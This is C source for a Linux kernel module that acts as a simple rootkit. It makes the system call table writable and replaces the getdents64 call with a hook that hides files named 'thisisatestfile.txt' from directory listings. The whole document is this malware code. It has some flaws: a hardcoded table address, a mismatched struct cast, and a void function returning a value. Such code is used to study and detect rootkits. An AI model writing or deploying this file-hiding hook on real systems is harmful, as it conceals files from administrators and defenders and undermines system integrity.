#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/moduleparam.h>
#include <linux/unistd.h>
#include <linux/semaphore.h>
#include <linux/dirent.h>
#include <asm/cacheflush.h>

#define FILE_NAME "thisisatestfile.txt"

void **sys_call_table;

asmlinkage int (*getdents64_original) (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);

asmlinkage int   getdents64_hook      (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
/*
run the actual system call,
loop through the struct returned,
searching each filename (linux_dirent64->d_name)
with the static constant FILE_NAME,
if it matches recalculating
what is being returned
*/
  int rtn;
  struct linux_dirent64 *cur = dirp;
  int i = 0;
  rtn = getdents64_original(fd, dirp, count);

  while (i < rtn) {
    if (strncmp(cur->d_name, FILE_NAME, strlen(FILE_NAME)) == 0) {
      int reclen = cur->d_reclen;
      char *next_rec = (char *)cur + reclen;
      int len = (int)dirp + rtn - (int)next_rec;
      memmove(cur, next_rec, len);
      rtn -= reclen;
      continue;
    }
    i += cur->d_reclen;
    cur = (struct linux_dirent*) ((char*)dirp + i);
  }
  return rtn;
}

int set_page_rw(unsigned long addr) {
  unsigned int level;
  pte_t *pte = lookup_address(addr, &level);
  if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
    return 0;
}

int set_page_ro(unsigned long addr) {
  unsigned int level;
  pte_t *pte = lookup_address(addr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

int f_init(void) {
  sys_call_table = (void*)0xc1454100;
  getdents64_original = sys_call_table[__NR_getdents64];

  set_page_rw(sys_call_table);
  sys_call_table[__NR_getdents64] = getdents64_hook;

  return 0;
}

void f_exit(void) {
  sys_call_table[__NR_getdents64] = getdents64_original;
  set_page_ro(sys_call_table);
  return 0;
}

MODULE_LICENSE("GPL");
module_init(f_init);
module_exit(f_exit);
